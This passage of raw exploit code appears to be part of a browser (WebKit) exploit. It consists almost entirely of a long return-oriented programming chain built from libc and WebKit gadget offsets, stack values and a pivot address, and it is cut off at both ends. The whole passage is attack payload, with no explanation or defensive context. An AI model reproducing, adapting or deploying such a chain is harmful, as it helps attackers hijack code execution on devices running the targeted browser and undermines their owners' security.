libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965096, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+361872, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+361888, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+362040, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+362072, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+362056, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+362024, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+362192, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+362208, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+362176, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+362296, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+362352, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+362472, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+362504, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+362488, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+270096, 
libc_base+793877, 
ropchain+362664, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+362632, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+362616, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+362720, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+362824, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+362856, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+362840, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+363016, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+362984, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+362968, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+363072, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+363176, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+363208, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+363192, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+363368, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+363336, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+363320, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+363424, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+363528, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+363560, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+363544, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+363632, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+363648, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+363808, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+363776, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+363760, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+363864, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+363968, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+364000, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+363984, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+364096, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+364080, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+364192, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965100, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+364272, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+364328, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+364408, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965096, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+364512, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+364528, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+364680, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+364712, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+364696, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+364664, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+364832, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+364848, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+364816, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+364936, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+364992, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+365064, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+365120, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+865136, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+365208, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965096, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+365312, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+365328, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+365480, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+365512, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+365496, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+365464, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+365608, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+365592, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+365696, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+365752, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965096, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+365832, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575, 
ropchain+360224, 
libc_base+759626, 
libc_base+792472, 
 pivot_addr,
libc_base+793877 
]);
db([4294965088, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+793877, 
ropchain+365984, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965100, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+366080, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+366136, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([4, 0]); 
set_gadget(libc_base+788575,); 
db([4, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+366288, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+366344, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+366464, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+366496, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+366480, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+366592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+366576, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+788575, 
ropchain+398680, 
webkit_base+2997875, 
libc_base+793877, 
ropchain+366664, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965100, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+366760, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+366816, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([12, 0]); 
set_gadget(libc_base+788575,); 
db([12, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+366968, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+367024, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+367144, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+367176, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+367160, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+367272, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+367256, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+788575, 
ropchain+398728, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965088, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+367408, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+367424, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+367584, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+367552, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+367536, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+367744, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+367776, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+367760, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+367728, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+367936, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+367904, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+367888, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+368040, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+368024, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+368136, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965100, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+368216, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+368272, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([4, 0]); 
set_gadget(libc_base+788575,); 
db([4, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+368424, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+368480, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+368552, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+368656, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+368640, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+562536, 
libc_base+793877, 
ropchain+368712, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+368792, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965088, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+368896, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+368912, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+369056, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+369024, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+369040, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([16, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877568, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+369256, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965100, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+369336, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+369392, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([10, 0]); 
set_gadget(libc_base+788575,); 
db([10, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+369544, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+369600, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+369672, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+369728, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+369816, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([142, 0]); 
set_gadget(libc_base+788575,); 
db([142, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+370008, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+369976, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+369960, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+370064, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+370168, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+370200, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+370184, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+370296, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+370280, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+370392, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965100, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+370472, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+370528, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([9, 0]); 
set_gadget(libc_base+788575,); 
db([9, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+370680, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+370736, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+370808, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+370864, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+865136, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+793877, 
ropchain+370968, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965100, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+371048, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+371104, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([4, 0]); 
set_gadget(libc_base+788575,); 
db([4, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+371256, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+371312, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+371432, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+371464, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+371448, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+371560, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+371544, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+788575, 
ropchain+398384, 
